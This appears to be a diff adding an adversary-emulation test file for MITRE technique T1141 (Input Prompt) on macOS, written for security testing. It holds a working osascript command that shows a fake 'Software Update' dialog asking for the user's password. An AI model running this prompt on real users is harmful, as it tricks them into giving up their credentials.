@@ -1,0 +1,19 @@
+---
+attack_technique: T1141
+display_name: Input Prompt
+tactic: Credential Access
+description: When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript.
+
+atomic_tests:
+- name: Prompt User for Password
+  description: |
+    Prompt User for Password (Local Phishing)
+    Reference: "http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html"
+
+  supported_platforms:
+    - macos
+
+  executor_nix:
+    name: sh
+    command: |
+      osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
